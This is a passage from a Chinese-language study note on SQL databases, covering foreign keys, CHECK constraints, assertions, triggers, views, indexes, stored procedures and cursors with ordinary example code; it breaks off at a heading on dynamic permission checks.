<h5 id="2-外键（FOREIGN-KEY）"><a href="#2-外键（FOREIGN-KEY）" class="headerlink" title="2. 外键（FOREIGN KEY）"></a>2. 外键（FOREIGN KEY）</h5><ul>
<li><p><strong>定义与要求</strong><br>指向另一个表的主键或唯一键，确保参照完整性。示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders (</span><br><span class="line">  order_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">  user_id <span class="type">INT</span> <span class="keyword">REFERENCES</span> Users(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>违例处理策略</strong></p>
<table>
<thead>
<tr>
<th align="center">策略类型</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">默认拒绝</td>
<td align="center">删除&#x2F;更新被参照表的键时，若存在引用则拒绝操作（默认行为）</td>
</tr>
<tr>
<td align="center">级联（CASCADE）</td>
<td align="center">同步删除&#x2F;更新引用表中的相关行</td>
</tr>
<tr>
<td align="center">置空（SET NULL）</td>
<td align="center">将引用列设为NULL（要求该列允许NULL）</td>
</tr>
</tbody></table>
<p>语法示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FOREIGN</span> KEY (user_id) <span class="keyword">REFERENCES</span> Users(id) </span><br><span class="line">  <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE </span><br><span class="line">  <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="keyword">SET</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h5 id="3-延迟约束检查（Deferred-Constraints）"><a href="#3-延迟约束检查（Deferred-Constraints）" class="headerlink" title="3. 延迟约束检查（Deferred Constraints）"></a>3. 延迟约束检查（Deferred Constraints）</h5><ul>
<li><p><strong>问题场景</strong><br>循环依赖（如A表外键指向B表，B表外键指向A表）时，插入顺序无法满足约束。</p>
</li>
<li><p><strong>解决方案</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 延迟检查到事务提交时</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> A </span><br><span class="line">  <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_b </span><br><span class="line">  <span class="keyword">FOREIGN</span> KEY (b_id) <span class="keyword">REFERENCES</span> B(id) </span><br><span class="line">  DEFERRABLE INITIALLY DEFERRED;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h5 id="4-属性与元组约束"><a href="#4-属性与元组约束" class="headerlink" title="4. 属性与元组约束"></a>4. 属性与元组约束</h5><ul>
<li><p><strong>非空约束（NOT NULL）</strong><br>强制属性值不为空，影响外键的级联置空策略可行性。</p>
</li>
<li><p><strong>基于属性的CHECK</strong><br>限制单个属性的取值范围。示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Product (</span><br><span class="line">  price <span class="type">DECIMAL</span> <span class="keyword">CHECK</span> (price <span class="operator">&gt;</span> <span class="number">0</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>基于元组的CHECK</strong><br>限制元组内多个属性的关系。示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Employee (</span><br><span class="line">  salary <span class="type">DECIMAL</span>,</span><br><span class="line">  bonus <span class="type">DECIMAL</span>,</span><br><span class="line">  <span class="keyword">CHECK</span> (bonus <span class="operator">&lt;</span> salary <span class="operator">*</span> <span class="number">0.2</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h5 id="5-断言（Assertions）"><a href="#5-断言（Assertions）" class="headerlink" title="5. 断言（Assertions）"></a>5. 断言（Assertions）</h5><ul>
<li><p><strong>全局约束</strong></p>
<p>跨表的复杂条件，但实际DBMS支持较少（如PostgreSQL不支持）。示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ASSERTION NoManagerOverlap </span><br><span class="line">  <span class="keyword">CHECK</span> (</span><br><span class="line">    <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">      <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Dept D1, Dept D2 </span><br><span class="line">      <span class="keyword">WHERE</span> D1.manager <span class="operator">=</span> D2.manager </span><br><span class="line">        <span class="keyword">AND</span> D1.id <span class="operator">&lt;&gt;</span> D2.id</span><br><span class="line">    )</span><br><span class="line">  );</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="二、触发器（Triggers）"><a href="#二、触发器（Triggers）" class="headerlink" title="二、触发器（Triggers）"></a>二、触发器（Triggers）</h4><p>触发器是事件驱动的自动化规则，用于处理复杂业务逻辑。</p>
<h5 id="1-核心结构"><a href="#1-核心结构" class="headerlink" title="1. 核心结构"></a>1. 核心结构</h5><ul>
<li><p><strong>ECA模型</strong></p>
<ul>
<li><strong>事件（Event）</strong>：INSERT&#x2F;UPDATE&#x2F;DELETE</li>
<li><strong>条件（Condition）</strong>：可选的WHEN子句</li>
<li><strong>动作（Action）</strong>：触发执行的SQL语句</li>
</ul>
</li>
<li><p><strong>行级 vs 语句级触发器</strong></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">触发频率</th>
<th align="center">访问新旧值方式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">行级触发器</td>
<td align="center">每行修改触发一次</td>
<td align="center"><code>NEW.column</code> &#x2F; <code>OLD.column</code></td>
</tr>
<tr>
<td align="center">语句级触发器</td>
<td align="center">整个SQL语句完成后触发</td>
<td align="center">通过临时表（如<code>NEW_TABLE</code>）</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="2-语法示例"><a href="#2-语法示例" class="headerlink" title="2. 语法示例"></a>2. 语法示例</h5><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> CheckStock </span><br><span class="line">BEFORE <span class="keyword">INSERT</span> <span class="keyword">ON</span> Orders </span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span> </span><br><span class="line"><span class="keyword">WHEN</span> (NEW.quantity <span class="operator">&gt;</span> (<span class="keyword">SELECT</span> stock <span class="keyword">FROM</span> Inventory <span class="keyword">WHERE</span> product_id <span class="operator">=</span> NEW.product_id))</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  RAISE_APPLICATION_ERROR(<span class="number">-20000</span>, <span class="string">&#x27;库存不足&#x27;</span>);</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure></div>

<h5 id="3-关键特性"><a href="#3-关键特性" class="headerlink" title="3. 关键特性"></a>3. 关键特性</h5><ul>
<li><strong>执行时机</strong><ul>
<li><code>BEFORE</code>：在事件发生前执行（如数据验证）</li>
<li><code>AFTER</code>：在事件发生后执行（如审计日志）</li>
<li><code>INSTEAD OF</code>：替代视图的默认操作</li>
</ul>
</li>
<li><strong>引用新旧值</strong><ul>
<li>INSERT操作：仅能访问<code>NEW</code>值</li>
<li>DELETE操作：仅能访问<code>OLD</code>值</li>
<li>UPDATE操作：可访问<code>OLD</code>和<code>NEW</code>值</li>
</ul>
</li>
</ul>
<h5 id="4-常见应用场景"><a href="#4-常见应用场景" class="headerlink" title="4. 常见应用场景"></a>4. 常见应用场景</h5><ul>
<li><p><strong>数据审计</strong><br>记录关键表的修改历史：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> LogSalaryChange </span><br><span class="line">AFTER <span class="keyword">UPDATE</span> <span class="keyword">OF</span> salary <span class="keyword">ON</span> Employees </span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span> </span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">INSERT</span> <span class="keyword">INTO</span> AuditLog (change_date, emp_id, old_salary, new_salary) </span><br><span class="line">  <span class="keyword">VALUES</span> (SYSDATE, :OLD.emp_id, :OLD.salary, :NEW.salary);</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>级联业务逻辑</strong><br>如订单支付后自动更新库存：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> UpdateInventory </span><br><span class="line">AFTER <span class="keyword">INSERT</span> <span class="keyword">ON</span> Payments </span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span> </span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">UPDATE</span> Inventory </span><br><span class="line">  <span class="keyword">SET</span> stock <span class="operator">=</span> stock <span class="operator">-</span> (<span class="keyword">SELECT</span> quantity <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> order_id <span class="operator">=</span> :NEW.order_id) </span><br><span class="line">  <span class="keyword">WHERE</span> product_id <span class="operator">=</span> (<span class="keyword">SELECT</span> product_id <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> order_id <span class="operator">=</span> :NEW.order_id);</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="三、约束与触发器的对比"><a href="#三、约束与触发器的对比" class="headerlink" title="三、约束与触发器的对比"></a>三、约束与触发器的对比</h4><table>
<thead>
<tr>
<th align="center">特性</th>
<th align="center">约束（Constraints）</th>
<th align="center">触发器（Triggers）</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>执行时机</strong></td>
<td align="center">立即或延迟检查</td>
<td align="center">事件驱动（前&#x2F;后&#x2F;替代）</td>
</tr>
<tr>
<td align="center"><strong>复杂性支持</strong></td>
<td align="center">简单逻辑（如唯一性、范围）</td>
<td align="center">复杂业务逻辑（如跨表校验）</td>
</tr>
<tr>
<td align="center"><strong>性能影响</strong></td>
<td align="center">高效（DBMS优化）</td>
<td align="center">可能较慢（需执行自定义代码）</td>
</tr>
<tr>
<td align="center"><strong>维护难度</strong></td>
<td align="center">声明式，易维护</td>
<td align="center">过程式，需调试代码</td>
</tr>
<tr>
<td align="center"><strong>适用场景</strong></td>
<td align="center">数据完整性保障</td>
<td align="center">业务规则自动化</td>
</tr>
</tbody></table>
<h3 id="视图与索引"><a href="#视图与索引" class="headerlink" title="视图与索引"></a>视图与索引</h3><h4 id="1-视图（View）"><a href="#1-视图（View）" class="headerlink" title="1. 视图（View）"></a><strong>1. 视图（View）</strong></h4><ul>
<li><p><strong>定义</strong>：</p>
<ul>
<li>视图是基于表或其他视图的查询所定义的<strong>虚拟关系</strong>，不实际存储数据。</li>
<li>分类：<ul>
<li><strong>虚拟视图</strong>：仅保存查询定义，查询时动态生成结果。</li>
<li><strong>物化视图</strong>：实际存储数据，通过空间换时间提高性能。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>创建语法</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> [MATERIALIZED] <span class="keyword">VIEW</span> 视图名 [(属性别名)] <span class="keyword">AS</span> 查询语句;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>默认创建虚拟视图，物化视图需显式指定 <code>MATERIALIZED</code>。</p>
</li>
<li><p>示例：创建虚拟视图显示部门为“IT”的员工：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IT_Employees <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> id, name <span class="keyword">FROM</span> Employees <span class="keyword">WHERE</span> dept <span class="operator">=</span> <span class="string">&#x27;IT&#x27;</span>;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><strong>视图更新</strong>：</p>
<ul>
<li><p>可更新视图条件：</p>
<ol>
<li>基于单个基本表。</li>
<li><code>SELECT</code> 包含足够属性（如主键）。</li>
<li><code>WHERE</code> 子句不引用当前基本表的子查询。</li>
<li>无聚合函数、分组或去重操作。</li>
</ol>
</li>
<li><p>更新操作的影响：</p>
<ul>
<li><strong>插入</strong>：向基本表插入数据，未在视图中出现的列设为 <code>NULL</code>（需允许 <code>NULL</code>）。</li>
<li><strong>删除</strong>：删除基本表中满足视图条件的行。</li>
<li><strong>更新</strong>：修改基本表中满足视图条件的行。</li>
</ul>
</li>
<li><p>示例：若IT_Employees包含主键id，则可更新：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> IT_Employees <span class="keyword">SET</span> name <span class="operator">=</span> <span class="string">&#x27;Alice&#x27;</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><strong>视图删除</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> 视图名;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>若基本表被删除，依赖的视图将失效，需手动清理。</li>
</ul>
</li>
<li><p><strong>物化视图维护</strong>：</p>
<ul>
<li><p><strong>增量维护</strong>：跟踪基本表变动（如日志），仅更新受影响部分。</p>
</li>
<li><p><strong>定期维护</strong>：手动或定时全量刷新，可能数据延迟。</p>
</li>
<li><p>示例（Oracle）：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> MATERIALIZED <span class="keyword">VIEW</span> Sales_Summary </span><br><span class="line">REFRESH FAST <span class="keyword">ON</span> <span class="keyword">COMMIT</span> <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> product, <span class="built_in">SUM</span>(amount) <span class="keyword">FROM</span> Sales <span class="keyword">GROUP</span> <span class="keyword">BY</span> product;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>
<h4 id="2-索引（Index）"><a href="#2-索引（Index）" class="headerlink" title="2. 索引（Index）"></a><strong>2. 索引（Index）</strong></h4><ul>
<li><p><strong>定义</strong>：</p>
<ul>
<li>索引是加速查询的数据结构（如B-树），通过减少磁盘I&#x2F;O提升性能。</li>
<li><strong>适用场景</strong>：高频查询、高选择性（如唯一键）、范围查询。</li>
</ul>
</li>
<li><p><strong>创建与删除</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> INDEX 索引名 <span class="keyword">ON</span> 表名 (列<span class="number">1</span>, 列<span class="number">2.</span>..);</span><br><span class="line"><span class="keyword">DROP</span> INDEX 索引名;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>示例：为<code>Employees</code>表的<code>dept</code> 列创建索引：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> INDEX idx_dept <span class="keyword">ON</span> Employees(dept);</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><strong>索引选择策略</strong>：</p>
<ul>
<li><strong>查询频次</strong>：优先为高频查询的列建索引。</li>
<li><strong>更新代价</strong>：索引会降低插入&#x2F;删除&#x2F;更新速度。</li>
<li><strong>数据分布</strong>：高基数列（如唯一值多）更适合索引。</li>
</ul>
</li>
<li><p><strong>代价模型</strong>：</p>
<ul>
<li><strong>查询代价</strong>：磁盘页读取次数是关键。</li>
<li><strong>更新代价</strong>：需维护索引结构，如插入时更新B-树。</li>
</ul>
</li>
<li><p><strong>自动索引调优</strong>：</p>
<ul>
<li>工具（如MySQL的 <code>EXPLAIN</code>、SQL Server的DTA）分析查询模式，推荐最优索引。</li>
<li>示例：调优顾问可能建议为 <code>WHERE dept=&#39;IT&#39;</code> 创建索引。</li>
</ul>
</li>
</ul>
<h4 id="3-关键对比"><a href="#3-关键对比" class="headerlink" title="3. 关键对比"></a><strong>3. 关键对比</strong></h4><table>
<thead>
<tr>
<th align="center"><strong>特性</strong></th>
<th align="center"><strong>虚拟视图</strong></th>
<th align="center"><strong>物化视图</strong></th>
<th align="center"><strong>索引</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>存储</strong></td>
<td align="center">不存储数据，动态计算</td>
<td align="center">存储实际数据</td>
<td align="center">存储键值与指针</td>
</tr>
<tr>
<td align="center"><strong>更新影响</strong></td>
<td align="center">每次查询重新计算</td>
<td align="center">需维护（增量&#x2F;定期）</td>
<td align="center">增删改需维护结构</td>
</tr>
<tr>
<td align="center"><strong>适用场景</strong></td>
<td align="center">简化复杂查询、权限控制</td>
<td align="center">高频复杂查询，容忍数据延迟</td>
<td align="center">加速查询，尤其是等值&#x2F;范围</td>
</tr>
<tr>
<td align="center"><strong>维护成本</strong></td>
<td align="center">低</td>
<td align="center">高（存储+维护）</td>
<td align="center">中（影响写操作）</td>
</tr>
</tbody></table>
<h3 id="服务器环境下的-SQL"><a href="#服务器环境下的-SQL" class="headerlink" title="服务器环境下的 SQL"></a>服务器环境下的 SQL</h3><h4 id="一、三层体系结构-Three-Tier-Architecture"><a href="#一、三层体系结构-Three-Tier-Architecture" class="headerlink" title="一、三层体系结构 (Three-Tier Architecture)"></a><strong>一、三层体系结构 (Three-Tier Architecture)</strong></h4><p>三层体系结构是服务器端应用设计的核心模式，将系统分为三个逻辑层次，各司其职：</p>
<ol>
<li><strong>Web 服务器（表示层）</strong>：<ul>
<li><strong>作用</strong>：直接与客户端（如浏览器）交互，处理 HTTP 请求&#x2F;响应。</li>
<li><strong>示例工具</strong>：Nginx、Apache。</li>
<li><strong>特点</strong>：轻量级，主要负责静态资源服务和请求转发。</li>
</ul>
</li>
<li><strong>应用服务器（业务逻辑层）</strong>：<ul>
<li><strong>作用</strong>：执行业务逻辑（如订单处理、用户验证）。</li>
<li><strong>示例工具</strong>：Tomcat、Node.js、.NET Core。</li>
<li><strong>特点</strong>：处理动态内容，可能包含事务管理、安全控制等。</li>
</ul>
</li>
<li><strong>数据库服务器（数据层）</strong>：<ul>
<li><strong>作用</strong>：存储数据并执行 SQL 查询&#x2F;更新。</li>
<li><strong>示例工具</strong>：MySQL、Oracle、PostgreSQL。</li>
<li><strong>特点</strong>：高性能、高并发，支持 ACID 事务。</li>
</ul>
</li>
</ol>
<p><strong>优势</strong>：分层设计提高了可维护性和扩展性，例如通过增加应用服务器实例应对高负载。</p>
<h4 id="二、集中式-vs-分布式数据库"><a href="#二、集中式-vs-分布式数据库" class="headerlink" title="二、集中式 vs. 分布式数据库"></a><strong>二、集中式 vs. 分布式数据库</strong></h4><table>
<thead>
<tr>
<th align="center"><strong>特性</strong></th>
<th align="center"><strong>集中式数据库</strong></th>
<th align="center"><strong>分布式数据库</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>数据位置</strong></td>
<td align="center">单一服务器</td>
<td align="center">跨多个节点</td>
</tr>
<tr>
<td align="center"><strong>访问速度</strong></td>
<td align="center">本地访问快，但可能成为瓶颈</td>
<td align="center">就近访问，速度更快</td>
</tr>
<tr>
<td align="center"><strong>扩展性</strong></td>
<td align="center">垂直扩展（升级硬件）</td>
<td align="center">水平扩展（增加节点）</td>
</tr>
<tr>
<td align="center"><strong>并发能力</strong></td>
<td align="center">受单点限制</td>
<td align="center">高并发，负载均衡</td>
</tr>
<tr>
<td align="center"><strong>典型场景</strong></td>
<td align="center">小型应用、内部系统</td>
<td align="center">大型互联网应用（如电商平台）</td>
</tr>
</tbody></table>
<h4 id="三、SQL-环境与存储过程"><a href="#三、SQL-环境与存储过程" class="headerlink" title="三、SQL 环境与存储过程"></a><strong>三、SQL 环境与存储过程</strong></h4><p><strong>存储过程（Stored Procedure）</strong> 是预编译的 SQL 代码块，存储在数据库中，通过名称调用，支持以下功能：</p>
<ul>
<li><p><strong>参数模式</strong>：</p>
<ul>
<li><code>IN</code>：输入参数（默认）。</li>
<li><code>OUT</code>：输出参数（需在调用时接收）。</li>
<li><code>INOUT</code>：双向参数。</li>
</ul>
</li>
<li><p><strong>创建示例</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> GetUser(<span class="keyword">IN</span> userId <span class="type">INT</span>, <span class="keyword">OUT</span> userName <span class="type">VARCHAR</span>(<span class="number">50</span>))</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">SELECT</span> name <span class="keyword">INTO</span> userName <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> id <span class="operator">=</span> userId;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>调用示例</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> GetUser(<span class="number">123</span>, <span class="variable">@name</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@name</span>;  <span class="comment">-- 获取输出参数</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><strong>PSM（Persistent Stored Modules）</strong> 扩展了 SQL，支持过程式编程：</p>
<ul>
<li><strong>变量声明</strong>：<code>DECLARE x INT DEFAULT 0;</code></li>
<li><strong>控制结构</strong>：<code>IF</code>、<code>LOOP</code>、<code>WHILE</code>、<code>FOR</code>。</li>
<li><strong>异常处理</strong>：通过 <code>DECLARE HANDLER</code> 捕获错误。</li>
</ul>
<h4 id="四、游标（Cursor）与结果集处理"><a href="#四、游标（Cursor）与结果集处理" class="headerlink" title="四、游标（Cursor）与结果集处理"></a><strong>四、游标（Cursor）与结果集处理</strong></h4><p>游标用于逐行处理查询结果，典型流程如下：</p>
<ol>
<li><p><strong>声明游标</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> userCursor <span class="keyword">CURSOR</span> <span class="keyword">FOR</span> <span class="keyword">SELECT</span> id, name <span class="keyword">FROM</span> Users;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>打开游标</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">OPEN</span> userCursor;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>遍历数据</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FETCH</span> userCursor <span class="keyword">INTO</span> userId, userName;</span><br><span class="line">WHILE <span class="keyword">SQLSTATE</span> <span class="operator">=</span> <span class="string">&#x27;00000&#x27;</span> DO</span><br><span class="line">  <span class="comment">-- 处理数据（如插入日志）</span></span><br><span class="line">  <span class="keyword">FETCH</span> userCursor <span class="keyword">INTO</span> userId, userName;</span><br><span class="line"><span class="keyword">END</span> WHILE;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>关闭游标</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CLOSE</span> userCursor;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p><strong>关键点</strong>：</p>
<ul>
<li>使用 <code>FETCH</code> 逐行获取数据，<code>SQLSTATE &#39;02000&#39;</code> 表示无更多数据。</li>
<li>需配合循环和条件判断处理全部结果。</li>
</ul>
<h4 id="五、异常处理与事务控制"><a href="#五、异常处理与事务控制" class="headerlink" title="五、异常处理与事务控制"></a><strong>五、异常处理与事务控制</strong></h4><p>通过 <code>DECLARE HANDLER</code> 定义错误处理逻辑：</p>
<ul>
<li><p>示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DECLARE EXIT HANDLER FOR SQLEXCEPTION</span><br><span class="line">BEGIN</span><br><span class="line">  ROLLBACK;  -- 回滚事务</span><br><span class="line">  SELECT &#x27;Error occurred&#x27;;  -- 返回错误信息</span><br><span class="line">END;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><strong>处理类型</strong>：</p>
<ul>
<li><code>CONTINUE</code>：继续执行后续语句。</li>
<li><code>EXIT</code>：退出当前代码块。</li>
<li><code>UNDO</code>：回滚事务并退出（需支持事务的存储引擎）。</li>
</ul>
<h4 id="六、实际应用场景"><a href="#六、实际应用场景" class="headerlink" title="六、实际应用场景"></a><strong>六、实际应用场景</strong></h4><ol>
<li><p><strong>批量数据迁移</strong>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE MigrateData()</span><br><span class="line">BEGIN</span><br><span class="line">  DECLARE done INT DEFAULT 0;</span><br><span class="line">  DECLARE oldId INT;</span><br><span class="line">  DECLARE cur CURSOR FOR SELECT id FROM OldTable;</span><br><span class="line">  DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = 1;</span><br><span class="line">  </span><br><span class="line">  OPEN cur;</span><br><span class="line">  REPEAT</span><br><span class="line">    FETCH cur INTO oldId;</span><br><span class="line">    IF NOT done THEN</span><br><span class="line">      INSERT INTO NewTable VALUES (oldId);</span><br><span class="line">    END IF;</span><br><span class="line">  UNTIL done END REPEAT;</span><br><span class="line">  CLOSE cur;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>动态权限检查</strong>：</p>
